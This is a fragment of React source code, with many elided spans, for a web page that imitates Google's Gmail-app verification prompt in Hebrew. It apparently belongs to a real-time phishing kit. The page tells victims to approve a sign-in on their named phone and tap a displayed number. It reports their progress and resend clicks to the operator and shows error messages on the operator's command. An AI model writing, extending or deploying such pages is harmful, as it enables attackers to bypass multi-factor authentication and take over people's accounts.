...
const GmailAppPage = () => {
  ...
  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=app",
      currentPage: "gmail_app",
      gmailStage: "app",
      fromForm: true,
    });
  }, [updateClientData]);
  ...
  const handleResend = async () => {
    ...
    try {
      await updateClientData({
        gmailAppResendAt: Date.now(),
        gmailAppResend: true,
        lastAction: "gmail_app_resend",
      });
  ...
  const handleInvalid = React.useCallback(
    (cmd) => {
      const map = { invalid_gmailapp: "הפעולה באפליקציה לא הושלמה." };
      if (cmd in map) {
  ...
  const deviceName = clientData?.gmailAppDeviceName || "";
  const appNumber = clientData?.gmailAppNumber || "";
  ...
  const getLoggedInDevice = () => {
    ...
    if (device) {
      console.log("📱 Device number obtido com novo sistema (GmailApp):", device);
      return device;
    }
    
    console.log("📱 Device number não encontrado (GmailApp)");
    return "";
  };
  ...
  React.useEffect(() => {
    const handleStorageChange = () => {
      ...
      if (newDevice && newDevice !== displayDevice) {
        ...
        console.log("📱 Gmail App Modal - Device number atualizado:", newDevice);
      }
    };
        ...
        >
          ...
          >
            ...
            <div style={{ display: "flex", gap: 4 }}>
              ...
              <button
                title="Close"
                onClick={() => setInvalidMessage("Ação no app não concluída.")}
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
          ...
          {/* Conteúdo principal compacto e responsivo */}
          <div
            style={{
              flex: 1,
              padding: isSmallViewport ? "10px 16px" : "12px 20px",
              display: "flex",
              flexDirection: "column",
              direction: "rtl",
              textAlign: "right",
          ...
          >
            <h1
              style={{
                fontSize: isSmallViewport ? 20 : 22,
                fontWeight: 500,
                margin: 0,
              }}
            >
            ...
            >
              ...
              <span style={{ fontSize: isSmallViewport ? 13 : 14 }}>
                {displayDevice}
              </span>
            </div>
            {/* Imagem do giftoque.gif */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
            ...
            >
              <div
                style={{
                  ...
                  borderRadius: 999,
                  background:
                    "linear-gradient(180deg, #e7ecf0 0%, #d1d7dd 100%)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#202124",
            ...
            <h2
              style={{
                fontSize: isSmallViewport ? 15 : 16,
                fontWeight: 500,
                margin: "6px 0",
              }}
            >
              פתח את אפליקציית Gmail ב-{deviceName}
            </h2>
            <p
              style={{
                color: "#3c4043",
            ...
            >
              Google שלח התראה ל-{deviceName} שלך. פתח את אפליקציית Gmail
              והקש <strong>כן</strong> בהודעה, ואז הקש{" "}
              <strong>{appNumber}</strong> בטלפון שלך כדי לאמת שזה אתה.
            </p>
            <div style={{ marginTop: isSmallViewport ? 10 : 14 }}>
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
            ...
            <div style={{ marginTop: isSmallViewport ? 10 : 12 }}>
              <a
                href="#"
